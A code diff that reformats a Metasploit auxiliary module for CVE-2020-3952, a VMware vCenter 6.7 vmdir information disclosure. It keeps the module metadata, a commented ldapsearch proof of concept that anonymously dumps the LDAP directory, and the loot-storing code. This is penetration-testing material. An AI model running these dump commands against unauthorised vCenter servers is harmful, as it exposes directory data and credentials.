@@ -9,30 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'VMware vCenter Server vmdir Information Disclosure',
-      'Description'    => %q{
-        This module uses an anonymous-bind LDAP connection to dump data from the
-        vmdir service in VMware vCenter Server version 6.7 prior to the 6.7U3f
-        update.
-      },
-      'Author'         => [
-        # Discovered by unknown researcher(s)
-        'wvu' # Module
-      ],
-      'References'     => [
-        ['CVE', '2020-3952'],
-        ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
-      ],
-      'DisclosureDate' => '2020-04-09', # Vendor advisory
-      'License'        => MSF_LICENSE,
-      'Actions'        => [['Dump', 'Description' => 'Dump all LDAP data']],
-      'DefaultAction'  => 'Dump',
-      'Notes'          => {
-        'Stability'    => [CRASH_SAFE],
-        'SideEffects'  => [IOC_IN_LOGS]
-      }
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'VMware vCenter Server vmdir Information Disclosure',
+        'Description' => %q{
+          This module uses an anonymous-bind LDAP connection to dump data from the
+          vmdir service in VMware vCenter Server version 6.7 prior to the 6.7U3f
+          update.
+        },
+        'Author' => [
+          # Discovered by unknown researcher(s)
+          'wvu' # Module
+        ],
+        'References' => [
+          ['CVE', '2020-3952'],
+          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
+        ],
+        'DisclosureDate' => '2020-04-09', # Vendor advisory
+        'License' => MSF_LICENSE,
+        'Actions' => [['Dump', 'Description' => 'Dump all LDAP data']],
+        'DefaultAction' => 'Dump',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
+      )
+    )
 
     register_advanced_options([
       OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
@@ -47,17 +50,17 @@ class MetasploitModule < Msf::Auxiliary
     "cn=password and lockout policy,#{base_dn}"
   end
 
-=begin PoC using ldapsearch(1)
-  Retrieve root DSE with base DN:
-    ldapsearch -xb "" -s base -H ldap://[redacted]
-
-  Dump data using discovered base DN:
-    ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
-=end
+  # PoC using ldapsearch(1):
+  #
+  # Retrieve root DSE with base DN:
+  #   ldapsearch -xb "" -s base -H ldap://[redacted]
+  #
+  # Dump data using discovered base DN:
+  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
   def run
     opts = {
-      host:            rhost,
-      port:            rport,
+      host: rhost,
+      port: rport,
       connect_timeout: datastore['ConnectTimeout']
     }
 
@@ -97,11 +100,11 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Storing LDAP data in loot')
 
     ldif_filename = store_loot(
-      self.name,            # ltype
-      'text/plain' ,        # ctype
-      rhost,                # host
-      ldif,                 # data
-      nil,                  # filename
+      name, # ltype
+      'text/plain', # ctype
+      rhost, # host
+      ldif, # data
+      nil, # filename
       "Base DN: #{base_dn}" # info
     )
 
